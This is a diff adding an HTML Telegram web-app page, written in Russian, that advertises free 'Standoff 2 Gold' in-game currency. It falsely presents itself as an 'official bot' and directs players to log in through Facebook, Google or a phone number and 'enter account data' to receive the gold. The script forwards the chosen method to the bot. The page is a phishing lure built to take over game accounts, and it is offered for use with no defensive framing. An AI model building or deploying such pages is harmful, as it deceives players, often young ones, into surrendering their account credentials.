@@ -1,1 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standoff 2 Gold</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
 
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: white;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Шапка как в Hamster Kombat */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .gold-icon {
+            font-size: 100px;
+            filter: drop-shadow(0 0 20px gold);
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 32px;
+            background: linear-gradient(45deg, #ffd700, #ffa500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .balance {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 20px;
+            padding: 10px 20px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .balance-text {
+            font-size: 14px;
+            color: #ffd700;
+        }
+
+        .balance-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+
+        /* Карточки методов входа */
+        .methods-title {
+            font-size: 18px;
+            margin: 20px 0 15px;
+            color: #a0a0a0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .method-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .method-card:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
+            border-color: #ffd700;
+        }
+
+        .method-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 215, 0, 0.1);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+
+        .method-info {
+            flex: 1;
+        }
+
+        .method-name {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .method-desc {
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+
+        .method-arrow {
+            color: #ffd700;
+            font-size: 20px;
+        }
+
+        /* Информационная карточка */
+        .info-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 20px;
+            margin-top: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .info-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            color: #ffd700;
+            margin-bottom: 15px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            color: #e0e0e0;
+            font-size: 14px;
+        }
+
+        .info-item span {
+            color: #ffd700;
+        }
+
+        /* Кнопка как в Hamster Kombat */
+        .tap-button {
+            background: linear-gradient(45deg, #ffd700, #ffa500);
+            border: none;
+            border-radius: 100px;
+            padding: 20px;
+            width: 100%;
+            font-size: 24px;
+            font-weight: bold;
+            color: #1a1a2e;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
+        }
+
+        .tap-button:hover {
+            transform: scale(0.98);
+            box-shadow: 0 5px 10px rgba(255, 215, 0, 0.4);
+        }
+
+        .tap-button:active {
+            transform: scale(0.95);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Шапка как в Hamster Kombat -->
+        <div class="header">
+            <div class="gold-icon">🪙</div>
+            <h1>STANDOFF 2 GOLD</h1>
+            <div class="balance">
+                <div class="balance-text">Доступно голды</div>
+                <div class="balance-amount">10 000 🪙</div>
+            </div>
+        </div>
+
+        <!-- Методы входа -->
+        <div class="methods-title">ВОЙТИ ЧЕРЕЗ</div>
+
+        <div class="method-card" onclick="selectMethod('facebook')">
+            <div class="method-icon">📘</div>
+            <div class="method-info">
+                <div class="method-name">Facebook</div>
+                <div class="method-desc">Быстрый вход через аккаунт Facebook</div>
+            </div>
+            <div class="method-arrow">→</div>
+        </div>
+
+        <div class="method-card" onclick="selectMethod('google')">
+            <div class="method-icon">🔵</div>
+            <div class="method-info">
+                <div class="method-name">Google</div>
+                <div class="method-desc">Вход через Google аккаунт</div>
+            </div>
+            <div class="method-arrow">→</div>
+        </div>
+
+        <div class="method-card" onclick="selectMethod('phone')">
+            <div class="method-icon">📱</div>
+            <div class="method-info">
+                <div class="method-name">Номер телефона</div>
+                <div class="method-desc">Вход по номеру телефона</div>
+            </div>
+            <div class="method-arrow">→</div>
+        </div>
+
+        <!-- Информация -->
+        <div class="info-card">
+            <div class="info-title">
+                <span>ℹ️</span> Как получить голду?
+            </div>
+            <div class="info-item">
+                <span>1.</span> Выберите способ входа
+            </div>
+            <div class="info-item">
+                <span>2.</span> Введите данные аккаунта
+            </div>
+            <div class="info-item">
+                <span>3.</span> Голда зачислится в течение 2 дней
+            </div>
+        </div>
+
+        <!-- Кнопка как в Hamster Kombat -->
+        <button class="tap-button" onclick="tapGold()">
+            👆 TAP TO GET GOLD
+        </button>
+
+        <div class="footer">
+            Standoff 2 Gold • Официальный бот
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+
+        // Функция выбора метода входа
+        function selectMethod(method) {
+            let methodName = '';
+            let methodEmoji = '';
+
+            switch(method) {
+                case 'facebook':
+                    methodName = 'Facebook';
+                    methodEmoji = '📘';
+                    break;
+                case 'google':
+                    methodName = 'Google';
+                    methodEmoji = '🔵';
+                    break;
+                case 'phone':
+                    methodName = 'Номер телефона';
+                    methodEmoji = '📱';
+                    break;
+            }
+
+            // Отправляем данные в бот
+            tg.sendData(JSON.stringify({
+                action: 'select_method',
+                method: methodName,
+                emoji: methodEmoji
+            }));
+
+            // Показываем уведомление
+            tg.showAlert(`Вы выбрали вход через ${methodName}`);
+        }
+
+        // Функция для тапа (как в Hamster Kombat)
+        function tapGold() {
+            // Создаем анимацию тапа
+            const button = document.querySelector('.tap-button');
+            button.style.transform = 'scale(0.95)';
+
+            setTimeout(() => {
+                button.style.transform = 'scale(1)';
+            }, 100);
+
+            // Показываем уведомление
+            tg.HapticFeedback.impactOccurred('heavy');
+            tg.showAlert('🪙 Начните с выбора метода входа!');
+        }
+
+        // Обработка данных из бота
+        tg.onEvent('mainButtonClicked', function() {
+            tg.sendData(JSON.stringify({action: 'main_button_clicked'}));
+        });
+    </script>
+</body>
+</html>
